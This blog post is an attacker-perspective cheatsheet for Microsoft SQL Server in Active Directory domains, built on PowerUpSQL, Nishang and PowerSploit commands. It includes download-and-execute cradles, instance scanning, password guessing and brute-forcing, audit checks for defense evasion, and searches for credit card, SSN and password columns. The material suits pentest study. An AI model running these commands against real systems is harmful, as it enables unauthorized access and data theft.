<!doctype html><!-- This site was created with Wowchemy. https://www.wowchemy.com --><!-- Last Published: March 15, 2023 --><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=generator content="Wowchemy 5.7.0 for Hugo"><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap" media=print onload='this.media="all"'><link rel=stylesheet href=/css/vendor-bundle.min.16f785cdb553c8c4431db6775122af35.css media=print onload='this.media="all"'><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/academicons@1.9.2/css/academicons.min.css integrity="sha512-KlJCpRsLf+KKu2VQa5vmRuClRFjxc5lXO03ixZt82HZUk41+1I0bD8KBSA0fY290ayMfWYI9udIqeOWSu1/uZg==" crossorigin=anonymous media=print onload='this.media="all"'><link rel=stylesheet href=/css/wowchemy.242b882c3b0c00ae28b251add3931eef.css><link rel=stylesheet href=/css/libs/chroma/github-light.min.css title=hl-light media=print onload='this.media="all"'><link rel=stylesheet href=/css/libs/chroma/dracula.min.css title=hl-dark media=print onload='this.media="all"' disabled><script async src="https://www.googletagmanager.com/gtag/js?id=G-NNZHY5233M"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}function trackOutboundLink(e,t){gtag("event","click",{event_category:"outbound",event_label:e,transport_type:"beacon",event_callback:function(){t!=="_blank"&&(document.location=e)}}),console.debug("Outbound link clicked: "+e)}function onClickCallback(e){if(e.target.tagName!=="A"||e.target.host===window.location.host)return;trackOutboundLink(e.target,e.target.getAttribute("target"))}gtag("js",new Date),gtag("config","G-NNZHY5233M",{}),gtag("set",{cookie_flags:"SameSite=None;Secure"}),document.addEventListener("click",onClickCallback,!1)</script><meta name=author content="Giovanni Pecoraro"><meta name=description content="MSSQL Servers integrate right out the box with Windows and Active Directory Domains. Consequently, there are trust relationships wich we can be leveraged from an attacker perspective."><link rel=alternate hreflang=en-us href=https://www.peco602.com/post/0070-mssql-cheatsheet/><link rel=canonical href=https://www.peco602.com/post/0070-mssql-cheatsheet/><link rel=manifest href=/manifest.webmanifest><link rel=icon type=image/png href=/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_32x32_fill_lanczos_center_3.png><link rel=apple-touch-icon type=image/png href=/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_180x180_fill_lanczos_center_3.png><meta name=theme-color content="#3f51b5"><meta property="twitter:card" content="summary"><meta property="twitter:site" content="@Peco602"><meta property="twitter:creator" content="@Peco602"><meta property="twitter:image" content="https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png"><meta property="og:site_name" content="Giovanni Pecoraro"><meta property="og:url" content="https://www.peco602.com/post/0070-mssql-cheatsheet/"><meta property="og:title" content="Microsoft SQL Server cheatsheet | Giovanni Pecoraro"><meta property="og:description" content="MSSQL Servers integrate right out the box with Windows and Active Directory Domains. Consequently, there are trust relationships wich we can be leveraged from an attacker perspective."><meta property="og:image" content="https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png"><meta property="og:locale" content="en-us"><meta property="article:published_time" content="2022-09-22T00:00:00+00:00"><meta property="article:modified_time" content="2022-09-22T00:00:00+00:00"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.peco602.com/post/0070-mssql-cheatsheet/"},"headline":"Microsoft SQL Server cheatsheet","datePublished":"2022-09-22T00:00:00Z","dateModified":"2022-09-22T00:00:00Z","author":{"@type":"Person","name":"Giovanni Pecoraro"},"publisher":{"@type":"Organization","name":"Giovanni Pecoraro","logo":{"@type":"ImageObject","url":"https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_3.png"}},"description":"MSSQL Servers integrate right out the box with Windows and Active Directory Domains. Consequently, there are trust relationships wich we can be leveraged from an attacker perspective."}</script><title>Microsoft SQL Server cheatsheet | Giovanni Pecoraro</title></head><body id=top data-spy=scroll data-offset=70 data-target=#TableOfContents class=page-wrapper data-wc-page-id=a70b1a7e1f744b422c9d435d4efa5a68><script src=/js/wowchemy-init.min.7532de8e15162845d694f17af8b46a99.js></script><aside class=search-modal id=search><div class=container><section class=search-header><div class="row no-gutters justify-content-between mb-3"><div class=col-6><h1>Search</h1></div><div class="col-6 col-search-close"><a class=js-search href=# aria-label=Close><i class="fas fa-times-circle text-muted" aria-hidden=true></i></a></div></div><div id=search-box><input name=q id=search-query placeholder=Search... autocapitalize=off autocomplete=off autocorrect=off spellcheck=false type=search class=form-control aria-label=Search...></div></section><section class=section-search-results><div id=search-hits></div></section></div></aside><div class="page-header header--fixed"><header><nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id=navbar-main><div class=container-xl><div class="d-none d-lg-inline-flex"><a class=navbar-brand href=/>Giovanni Pecoraro</a></div><button type=button class=navbar-toggler data-toggle=collapse data-target=#navbar-content aria-controls=navbar-content aria-expanded=false aria-label="Toggle navigation">
<span><i class="fas fa-bars"></i></span></button><div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none"><a class=navbar-brand href=/>Giovanni Pecoraro</a></div><div class="navbar-collapse main-menu-item collapse justify-content-start" id=navbar-content><ul class="navbar-nav d-md-inline-flex"><li class=nav-item><a class=nav-link href=/#about><span>Home</span></a></li><li class=nav-item><a class=nav-link href=/#posts><span>Posts</span></a></li><li class=nav-item><a class=nav-link href=/#projects><span>Projects</span></a></li><li class=nav-item><a class=nav-link href=/#talks><span>Talks</span></a></li><li class=nav-item><a class=nav-link href=/#featured><span>Publications</span></a></li><li class=nav-item><a class=nav-link href=/#contact><span>Contact</span></a></li></ul></div><ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2"><li class="nav-item d-none d-lg-inline-flex"><a class=nav-link href=https://twitter.com/Peco602 data-toggle=tooltip data-placement=bottom title="Follow me on Twitter" target=_blank rel=noopener aria-label="Follow me on Twitter"><i class="fab fa-twitter" aria-hidden=true></i></a></li><li class=nav-item><a class="nav-link js-search" href=# aria-label=Search><i class="fas fa-search" aria-hidden=true></i></a></li><li class="nav-item dropdown theme-dropdown"><a href=# class=nav-link data-toggle=dropdown aria-haspopup=true aria-label="Display preferences"><i class="fas fa-moon" aria-hidden=true></i></a><div class=dropdown-menu><a href=# class="dropdown-item js-set-theme-light"><span>Light</span></a>
<a href=# class="dropdown-item js-set-theme-dark"><span>Dark</span></a>
<a href=# class="dropdown-item js-set-theme-auto"><span>Automatic</span></a></div></li></ul></div></nav></header></div><div class=page-body><article class=article><div class="article-container pt-3"><h1>Microsoft SQL Server cheatsheet</h1><p class=page-subtitle>MSSQL Servers integrate right out the box with Windows and Active Directory Domains. Consequently, there are trust relationships wich we can be leveraged from an attacker perspective.</p><div class=article-metadata><div><span class=author-highlighted>Giovanni Pecoraro</span></div><span class=article-date>Sep 22, 2022</span>
<span class=middot-divider></span>
<span class=article-reading-time>22 min read</span>
<span class=middot-divider></span>
<span class=article-categories><i class="fas fa-folder mr-1"></i><a href=/category/cyber-security/>Cyber Security</a></span></div></div><div class=article-container><div class=article-style><p><strong>What is SQL Server?</strong></p><ul><li>A database platform</li><li>A Windows application</li><li>A set of Windows Services</li></ul><p><figure><div class="d-flex justify-content-center"><div class=w-100><img src=./mssql_structure.png alt="MSSQL Structure" loading=lazy data-zoomable></div></div></figure></p><p><em>Important Notes</em></p><ul><li>OS command are usually executed as the service account</li><li>The service account is a <strong>sysadmin</strong> by default</li><li>Clustered servers are required to have the same service account</li></ul><p><strong>How do I authenticate?</strong></p><p>Account Types:</p><ul><li>Windows Account:<ul><li>Used to login</li><li>Mapped to SQL Server login</li></ul></li><li>SQL Server Login<ul><li>Used to login</li><li>Mapped to database account</li></ul></li><li>Database User<ul><li>Used to access databases</li></ul></li></ul><p><figure><div class="d-flex justify-content-center"><div class=w-100><img src=./mssql_authentication.png alt="MSSQL Authentication" loading=lazy data-zoomable></div></div></figure></p><p><strong>Important Roles</strong></p><ul><li>Server Roles:<ul><li>Sysadmin = Database Administrator</li><li>Public Role = Everyone with CONNECT</li></ul></li><li>Database Roles:<ul><li>Database Owner = SQL login that owns the database ☺</li><li>DB_OWNER role = Allows members to take most actions in the database</li></ul></li></ul><p>A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures. Database links work even across forest trusts.</p><h2 id=powerupsql-setup>PowerUpSQL Setup</h2><ol><li>All possible setup options:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Download to Disk + Import Module</span>
</span></span><span class=line><span class=cl><span class=c># Download from https://github.com/NetSPI/PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Import-Module</span> <span class=n>PowerUpSQL</span><span class=p>.</span><span class=py>psd1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Download/Import to Memory: Download Cradle 1</span>
</span></span><span class=line><span class=cl><span class=n>IEX</span><span class=p>(</span><span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Net</span><span class=p>.</span><span class=n>WebClient</span><span class=p>).</span><span class=py>DownloadString</span><span class=p>(</span><span class=s2>&#34;https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Download/Import to Memory: Common Download Cradle 2</span>
</span></span><span class=line><span class=cl><span class=p>&amp;([</span><span class=no>scriptblock</span><span class=p>]::</span><span class=n>Create</span><span class=p>((</span><span class=nb>new-object</span> <span class=n>net</span><span class=p>.</span><span class=n>webclient</span><span class=p>).</span><span class=py>downloadstring</span><span class=p>(</span><span class=s2>&#34;https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1&#34;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Install Module from PowerShell Gallery</span>
</span></span><span class=line><span class=cl><span class=nb>Install-Module</span> <span class=n>-Name</span> <span class=n>PowerUpSQL</span>
</span></span></code></pre></div><ol start=2><li>List all PowerUpSQL available functions:</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-Command</span> <span class=err>–</span><span class=n>Module</span> <span class=n>PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Get-Help</span> <span class=p>[</span><span class=no>FUNCTION_NAME</span><span class=p>]</span> <span class=n>-Full</span>
</span></span></code></pre></div><h2 id=discovery>Discovery</h2><h3 id=net-classes---remote-discovery>.NET Classes - Remote Discovery</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>[</span><span class=no>System.Data.Sql.SqlDataSourceEnumerator</span><span class=p>]::</span><span class=n>Instance</span><span class=p>.</span><span class=py>GetDataSources</span><span class=p>()</span>
</span></span></code></pre></div><h3 id=local-discovery>Local Discovery</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=c># OS Authentication Level: Local User</span>
</span></span><span class=line><span class=cl><span class=c># Technique: Locate services and registry keys</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceLocal</span>
</span></span></code></pre></div><h3 id=remote-discovery>Remote Discovery</h3><p>List SQL Servers using UDP port scan:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=c># OS Authentication Level: Unauthenticated</span>
</span></span><span class=line><span class=cl><span class=c># Technique: UDP port scan</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceScanUDP</span> <span class=n>-Verbose</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER1&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceScanUDPThreaded</span> <span class=n>-Verbose</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER1&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Get the instance list from a file  </span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceFile</span> <span class=n>-FilePath</span> <span class=n>c:</span><span class=p>\</span><span class=n>temp</span><span class=p>\</span><span class=n>computers</span><span class=p>.</span><span class=py>txt</span> <span class=p>|</span> <span class=nb>Get-SQLInstanceScanUDPThreaded</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>List SQL Servers using UDP broadcast ping:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=c># OS Authentication Level: Unauthenticated</span>
</span></span><span class=line><span class=cl><span class=c># Technique: UDP broadcast ping</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceBroadcast</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>List SQL Servers using TCP port scan (MSSQL exposes port 1433):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
</span></span><span class=line><span class=cl><span class=c># OS Authentication Level: Unauthenticated</span>
</span></span><span class=line><span class=cl><span class=c># Technique: TCP port scan</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-PortScan</span> <span class=n>-StartAddress</span> <span class=p>[</span><span class=no>START_IP_ADDRESS</span><span class=p>]</span> <span class=n>-EndAddress</span> <span class=p>[</span><span class=no>END_IP_ADDRESS</span><span class=p>]</span> <span class=n>-ScanPort</span> <span class=n>-Port</span> <span class=mf>1433</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># PowerSploit</span>
</span></span><span class=line><span class=cl><span class=c># OS Authentication Level: Unauthenticated</span>
</span></span><span class=line><span class=cl><span class=c># Technique: TCP port scan</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-PortScan</span> <span class=n>-Hosts</span> <span class=s2>&#34;COMPUTER1&#34;</span> <span class=n>-Ports</span> <span class=mf>1433</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl><span class=nv>$result</span> <span class=p>=</span> <span class=nb>Invoke-PortScan</span> <span class=n>-Hosts</span> <span class=vm>@</span><span class=p>(</span><span class=s2>&#34;COMPUTER1&#34;</span><span class=p>,</span><span class=s2>&#34;COMPUTER2&#34;</span><span class=p>)</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl><span class=nv>$result</span> <span class=p>|</span> <span class=p>|</span> <span class=p>%</span> <span class=p>{</span> <span class=nb>echo </span><span class=nv>$_</span><span class=p>.</span><span class=py>hostname</span> <span class=nv>$_</span><span class=p>.</span><span class=n>openPorts</span><span class=p>}</span>
</span></span></code></pre></div><p>List Active Directory Domain SQL Server Instances:</p><ul><li><p>Using current domain credentials:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=c># OS Authentication Level: Domain User</span>
</span></span><span class=line><span class=cl><span class=c># Technique: Query ADS via LDAP for SPNs</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceDomain</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># List SQL Server instances running as a specific domain account</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceDomain</span> <span class=n>-DomainAccount</span> <span class=s2>&#34;SQLSvc&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># List shared domain user SQL Server service accounts (not machine account &#34;*$&#34;):</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceDomain</span> <span class=n>-Verbose</span> <span class=p>|</span> <span class=nb>Group-Object</span> <span class=n>DomainAccount</span> <span class=p>|</span> <span class=nb>Sort-Object</span> <span class=n>count</span> <span class=n>-Descending</span> <span class=p>|</span> <span class=nb>select </span><span class=n>Count</span><span class=p>,</span><span class=n>Name</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{(</span><span class=nv>$_</span><span class=p>.</span><span class=py>name</span> <span class=o>-notlike</span> <span class=s2>&#34;*$&#34;</span><span class=p>)</span> <span class=o>-and</span> <span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=py>count</span> <span class=o>-gt</span> <span class=mf>1</span><span class=p>)</span> <span class=p>}</span>
</span></span></code></pre></div></li><li><p>Using alternative domain credentials:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>runas</span> <span class=p>/</span><span class=n>noprofile</span> <span class=p>/</span><span class=n>netonly</span> <span class=p>/</span><span class=n>user</span><span class=err>:</span><span class=s2>&#34;CYBERCORP\STUDENT1&#34;</span>  <span class=n>PowerShell</span><span class=p>.</span><span class=py>exe</span>  
</span></span><span class=line><span class=cl><span class=nb>Import-Module</span> <span class=n>PowerUpSQL</span><span class=p>.</span><span class=py>psd1</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceDomain</span> <span class=n>-Verbose</span> <span class=n>-DomainController</span> <span class=s2>&#34;CYBERCORP-DC.CYBERCORP.LOCAL&#34;</span> <span class=n>-Username</span> <span class=s2>&#34;CYBERCORP\STUDENTI1&#34;</span> <span class=n>-password</span> <span class=s2>&#34;PASSWORD&#34;</span>
</span></span></code></pre></div></li></ul><h2 id=initial-access>Initial Access</h2><p><strong>How do I get access?</strong></p><p>Common Methods:</p><ul><li>Attempt to login with local or domain user privileges (Very Common)</li><li>Computer accounts work too ☺</li><li>Weak SQL Server login passwords</li><li>Default SQL Server login passwords</li><li>Default SQL Server login passwords associated with 3rd party applications</li></ul><p><strong>Why can domain users log to SQL Server?</strong></p><ul><li>Domain users added to role (Week devops)</li><li>Local users added to role</li><li>Privilege inheritance (Mostly express versions)</li></ul><p><figure><div class="d-flex justify-content-center"><div class=w-100><img src=./mssql_users.png alt="MSSQL Users" loading=lazy data-zoomable></div></div></figure></p><h3 id=check-sql-server-accessibility>Check SQL Server accessibility</h3><h4 id=unauthenticated-user>Unauthenticated user</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=c># OS Authentication Level: Unauthenticated</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceUDPScan</span> <span class=p>|</span> <span class=nb>Get-SQLConnectionTestThreaded</span> <span class=n>-Verbose</span> <span class=n>-Threads</span> <span class=mf>15</span> <span class=n>-Username</span> <span class=s2>&#34;testuser&#34;</span> <span class=n>-Password</span> <span class=s2>&#34;testpass&#34;</span>
</span></span></code></pre></div><h4 id=local-user>Local user</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=c># OS Authentication Level: Local User</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceLocal</span> <span class=p>|</span> <span class=nb>Get-SQLConnectionTestThreaded</span> <span class=n>-Verbose</span> 
</span></span></code></pre></div><h4 id=domain-user>Domain user</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=c># OS Authentication Level: Domain User</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceDomain</span> <span class=p>|</span> <span class=nb>Get-SQLConnectionTestThreaded</span> <span class=err>–</span><span class=n>Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Get a list of domain SQL servers that can be logged into with a provided SQL Server login</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceDomain</span> <span class=n>-Verbose</span> <span class=p>|</span> <span class=nb>Get-SQLConnectionTestThreaded</span> <span class=n>-Verbose</span> <span class=n>-Threads</span> <span class=mf>10</span> <span class=n>-username</span> <span class=s2>&#34;testuser&#34;</span>  <span class=n>-password</span> <span class=s2>&#34;testpass&#34;</span>
</span></span></code></pre></div><h4 id=alternative-domain-user>Alternative domain user</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=c># OS Authentication Level: Alternative Domain User</span>
</span></span><span class=line><span class=cl><span class=n>runas</span> <span class=p>/</span><span class=n>noprofile</span> <span class=p>/</span><span class=n>netonly</span> <span class=p>/</span><span class=n>user</span><span class=err>:</span><span class=n>domain</span><span class=p>\</span><span class=n>user</span> <span class=n>PowerShell</span><span class=p>.</span><span class=py>exe</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceDomain</span> <span class=p>|</span> <span class=nb>Get-SQLConnectionTestThreaded</span> <span class=err>–</span><span class=n>Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Get a list of domain SQL servers that can be logged into using an alternative domain account from a non domain system.</span>
</span></span><span class=line><span class=cl><span class=n>runas</span> <span class=p>/</span><span class=n>noprofile</span> <span class=p>/</span><span class=n>netonly</span> <span class=p>/</span><span class=n>user</span><span class=err>:</span><span class=s2>&#34;CYBERCORP\STUDENT1&#34;</span>  <span class=n>PowerShell</span><span class=p>.</span><span class=py>exe</span>  
</span></span><span class=line><span class=cl><span class=nb>Import-Module</span> <span class=n>PowerUpSQL</span><span class=p>.</span><span class=py>psd1</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceDomain</span> <span class=n>-Verbose</span> <span class=n>-DomainController</span> <span class=s2>&#34;CYBERCORP-DC.CYBERCORP.LOCAL&#34;</span> <span class=n>-Username</span> <span class=s2>&#34;CYBERCORP\STUDENTI1&#34;</span> <span class=n>-password</span> <span class=s2>&#34;PASSWORD&#34;</span> <span class=p>|</span> <span class=nb>Get-SQLConnectionTestThreaded</span> <span class=n>-Verbose</span> <span class=n>-Threads</span> <span class=mf>15</span>
</span></span></code></pre></div><h3 id=password-guessing>Password Guessing</h3><p>Discover domain SQL Servers and determine if they are configured with default passwords used by common 3rd party applications based on the instance name (it covers 41 application specific default SQL Server instances, users and passwords):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceLocal</span> <span class=p>|</span> <span class=nb>Invoke-SQLAuditDefaultLoginPw</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceDomain</span> <span class=p>|</span> <span class=nb>Invoke-SQLAuditDefaultLoginPw</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>It is possible to create a user list using the following methods:</p><ul><li><p>Enumerates SQL Server Logins based on login id using SUSER_NAME() and only the Public role:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLFuzzServerLogin</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span> <span class=n>-Verbose</span>
</span></span></code></pre></div></li><li><p>Enumerates <strong>domain groups</strong>, <strong>computer accounts</strong>, and <strong>user accounts</strong> based on domain RID using SUSER_SNAME() and only the Public role. Note: In a typical domain 10000 or more is recommended for the EndId. (Blindly enumerate domain users and group associated with the SQL Server domain with least privilege SQL login):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLFuzzDomainAccount</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span> <span class=n>-StartId</span> <span class=mf>500</span> <span class=n>-EndId</span> <span class=mf>10000</span>
</span></span></code></pre></div></li><li><p>Enumerate all SQL Logins as least privilege user and test username as password (Custom user/password lists can also be provided):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLAuditWeakLoginPw</span> <span class=n>-Verbose</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLAuditWeakLoginPw</span> <span class=n>-Verbose</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span>  <span class=n>-UserFile</span> <span class=s2>&#34;C:\dict\users.txt&#34;</span> <span class=n>-PassFile</span> <span class=s2>&#34;C:\dict\passwords.txt&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
</span></span><span class=line><span class=cl><span class=nv>$comps</span> <span class=p>=</span> <span class=p>(</span><span class=nb>Get-SQLInstanceDomain</span><span class=p>).</span><span class=py>ComputerName</span>
</span></span><span class=line><span class=cl><span class=nv>$comps</span> <span class=p>|</span> <span class=nb>Invoke-BruteForce</span> <span class=n>-UserList</span> <span class=s2>&#34;C:\dict\users.txt&#34;</span> <span class=n>-PasswordList</span> <span class=s2>&#34;C:\dict\passwords.txt&#34;</span> <span class=n>-Service</span> <span class=n>SQL</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>The &ldquo;sa&rdquo; user is always present, but it is disabled by default (if enabled it can always be brute-forced).</p></li></ul><h3 id=defense-evasion>Defense Evasion</h3><p>In order to evade defense it is suggested to use techniques that aren’t being audited:</p><ol><li><p>Get audit server specifications from target SQL Servers:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLAuditServerSpec</span> <span class=n>-Verbose</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span>
</span></span></code></pre></div></li><li><p>Get audit database specifications from target SQL Servers:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLAuditDatabaseSpec</span> <span class=n>-Verbose</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1&#34;</span>
</span></span></code></pre></div></li></ol><h3 id=information-gathering>Information Gathering</h3><p>Get information (SQL/OS versions, service accounts, &mldr;) from a single server and check if the current user has sysadmin privs:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLServerInfo</span> <span class=n>-Verbose</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span>
</span></span></code></pre></div><p>Get information from domain servers and check if the current user has sysadmin privs:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceDomain</span> <span class=p>|</span> <span class=nb>Get-SQLServerInfo</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceDomain</span> <span class=p>|</span> <span class=nb>Get-SQLServerInfoThreaded</span> <span class=n>-Threads</span> <span class=mf>10</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><p>Get list of non-default databases:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceDomain</span> <span class=p>|</span> <span class=nb>Get-SQLDatabaseThreaded</span> <span class=n>-Verbose</span> <span class=n>-Threads</span> <span class=mf>10</span> <span class=n>-NoDefaults</span>
</span></span></code></pre></div><p>Get an inventory of common objects from the remote server including permissions, databases, tables, views etc, and dump them out into CSV files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-SQLDumpInfo</span> <span class=n>-Verbose</span> <span class=n>-Instance</span> <span class=s2>&#34;SQLServer1\Instance1&#34;</span>
</span></span></code></pre></div><p>Find sensitive data based on column name:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerUpSQL</span>
</span></span><span class=line><span class=cl><span class=nb>Get-SQLInstanceDomain</span> <span class=p>|</span> <span class=nb>Get-SQLColumnSampleDataThreaded</span> <span class=n>-Verbose</span> <span class=n>-Threads</span> <span class=mf>10</span> <span class=n>-Keyword</span> <span class=s2>&#34;credit,ssn,password&#34;</span> <span class=n>-SampleSize</span> <span class=mf>2</span> <span class=n>-ValidateCC</span> <span class=n>-NoDefaults</span>
